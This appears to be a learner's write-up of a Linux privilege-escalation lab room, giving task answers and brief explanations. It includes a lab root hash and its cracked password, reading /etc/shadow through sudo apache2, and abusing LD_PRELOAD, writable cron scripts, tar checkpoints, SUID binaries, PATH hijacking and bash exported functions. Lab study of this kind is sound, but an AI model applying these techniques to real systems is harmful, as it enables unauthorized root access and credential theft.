# Linux PrivEsc Room

## Task 1

### 1 - deploy

### 2 - Run the "id" command. What is the result?

```
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

## Task 2

### 1 - just do the walkthrough

## Task 3

###  1- What is the root user's password hash?
```
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```

### 2 - What hashing algorithm was used to produce the root user's password hash?

When running john the ripper to crack the hash, the identified algorithm is printed

```
sha512crypt
```

### What is the root user's password?

```
password123
```

## Task 4

### 1 - just do the walkthrough

## Task 5

### 1 - Run the "id" command as the newroot user. What is the result?
```
uid=0(root) gid=0(root) groups=0(root)
```
## Task 6

### 1 - How many programs is "user" allowed to run via sudo?

just do sudo -l

```
11
```

### 2- One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

```
apache2
```

### - Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.

First check what the program can do 

```
apache2 -h
```

One interesting thing is that a SeverConfigFile can be passed lets check what it does with a file that is not intended to that

```
apache2 -f /etc/shadow

ERROR: Invalid command 'root:$6$Bpo0vPJ.upnZwV6$6Y0iHQANQNyaLUQzFmB.2IFKoKXfEvMx/EPs23Hy/GkitDbylIg6.VRO5VBAI.AdXy7U84YWEeEyqk.Um3WRj0:17298:0:99999:7:::',
```

Well, we got the content of the /etc/shadow... just need to crack the password

## Task 7

sudo -l

```
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

if we issue a call with LD_PRELOAD it will load the libraries (or the objects) before the application we are trying to execute... As in the example the programs consisted only of spawning a bash shell (besides the env variable cleaning and the setresuid) and since we are running it with sudo, we will get a sudo shell.

The LD_LIBRARY_PATH will do the sabe but for the libraries

## Task 8

after running 

```
cat /etc/crontab
```

Exist an entry to run a file called overwrite.sh which have world rw permissions and is executed by root.

This walk explains only that from time to time it will be executed (its a cron task) and since is world writable we can create a backdoor with it using a reverse shell.


## Task 9

This is the same, just showing that the path variable is set in the crontab and contains the regular user folder in the beggining which will make the overwrite.sh from the user folder to be executed instead of the intended.

## Task 10

This task abuses the tar application and its checkpoint feature. This feature allows to execute a program when a checkpoint is reached. 
<br>
since the compress.sh script compressess all the files without checking it will identify those created files as commands and will execute them

## Task 11

First we need to find binaries with SUID and GUID bit set... i used a different command than the shown one

```
find / -type f -perm /u+s,g+s -print 2>/dev/null


Result:
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/chage
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/wall
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/tmp/rootBash
/sbin/unix_chkpwd
/sbin/mount.nfs
```

After this the idea would be check the exploit db for all of this binaries. Since they are alot and its written in the walktrough which it is, lets search.

## Task 12

The walkthrough just injects a shared object to take leverage of a missing .config file seen through the strace app.

To exploit this shared libraries vulns the file that spawns a shell needs to have an \__attribute__((constructor)) that will call the function when the library is loaded.
<br>
Contrary, if __attribute__((destructor)) was used, it would be called when the library was unloaded.

## Task 13

Since the call to service to launch the apache server was not using absolute paths, relying on name resolution through path and since it uses the path from the user executing the binary, the path variable can be modified to search in a specific directory first and make an exploit that just spawns a shell.

## Task 14

I didnt knew, but creating shell functions is possible and quite easy.
<br>
Something like this is achievable in bash

```
function hello { echo "hello world"; }

~ hello 
hello world
```

in the running version of bash (version < 4.2-048), it is possible to create functions with path-like names and this would break the absolute paths as this task tried to mitigate from the last

```

function /usr/sbin/service { /bin/bash -p}
export -f /usr/sbin/service (the trick is in the -f, which refers to functions)
```

## Task 15